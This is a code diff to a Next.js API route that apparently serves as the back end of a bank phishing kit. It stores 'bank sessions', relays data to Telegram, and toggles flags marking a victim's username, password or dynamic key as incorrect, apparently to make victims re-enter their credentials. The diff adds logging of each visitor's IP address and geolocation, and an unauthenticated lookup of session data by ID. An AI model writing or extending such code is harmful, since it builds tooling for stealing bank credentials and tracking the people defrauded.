@@ -1,8 +1,28 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { PrismaClient } from '@prisma/client';
-import { sendToTelegram } from '@/lib/telegram';
+import { sendToTelegram, getGeoLocation } from '@/lib/telegram';
 
 const prisma = new PrismaClient();
+
+// Función para obtener la IP real del cliente
+function getClientIp(request: NextRequest): string {
+  // Intentar obtener IP de varios headers
+  const forwarded = request.headers.get('x-forwarded-for');
+  const realIp = request.headers.get('x-real-ip');
+  const cfConnectingIp = request.headers.get('cf-connecting-ip');
+  
+  if (forwarded) {
+    return forwarded.split(',')[0].trim();
+  }
+  if (realIp) {
+    return realIp;
+  }
+  if (cfConnectingIp) {
+    return cfConnectingIp;
+  }
+  
+  return 'unknown';
+}
 
 export async function POST(request: NextRequest) {
   try {
@@ -12,6 +32,21 @@ export async function POST(request: NextRequest) {
     switch (action) {
       case 'create_session':
         const generatedSessionId = `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+        
+        // Obtener IP del cliente
+        const clientIp = getClientIp(request);
+        
+        // Obtener geolocalización
+        let geoCity = null;
+        let geoCountry = null;
+        if (clientIp !== 'unknown') {
+          const geoData = await getGeoLocation(clientIp);
+          if (geoData) {
+            geoCity = geoData.city;
+            geoCountry = geoData.country;
+          }
+        }
+        
         const session = await prisma.bankSession.create({
           data: {
             sessionId: generatedSessionId,
@@ -37,6 +72,11 @@ export async function POST(request: NextRequest) {
             
             // Monto total
             totalAmount: data.totalAmount,
+            
+            // Geolocalización
+            ipAddress: clientIp,
+            geoCity: geoCity,
+            geoCountry: geoCountry,
             
             // Status y datos JSON como respaldo
             status: 'processing',
@@ -223,6 +263,27 @@ export async function POST(request: NextRequest) {
           return NextResponse.json({ error: 'Failed to send to Telegram' }, { status: 500 });
         }
 
+      case 'clear_usuario_flag':
+        await prisma.bankSession.update({
+          where: { sessionId: data.sessionId },
+          data: { usuarioIncorrecto: false }
+        });
+        return NextResponse.json({ success: true });
+      
+      case 'clear_clave_flag':
+        await prisma.bankSession.update({
+          where: { sessionId: data.sessionId },
+          data: { claveIncorrecta: false }
+        });
+        return NextResponse.json({ success: true });
+      
+      case 'clear_dinamica_flag':
+        await prisma.bankSession.update({
+          where: { sessionId: data.sessionId },
+          data: { dinamicaIncorrecta: false }
+        });
+        return NextResponse.json({ success: true });
+
       default:
         return NextResponse.json({ error: 'Action not found' }, { status: 400 });
     }
@@ -244,6 +305,15 @@ export async function GET(request: NextRequest) {
           where: { sessionId: sessionId! }
         });
         return NextResponse.json({ success: true, session });
+      
+      default:
+        // Soporte para GET sin action - buscar por sessionId
+        if (sessionId) {
+          const sess = await prisma.bankSession.findUnique({
+            where: { sessionId }
+          });
+          return NextResponse.json({ success: true, session: sess });
+        }
 
       case 'get_all_sessions':
         const sessions = await prisma.bankSession.findMany({
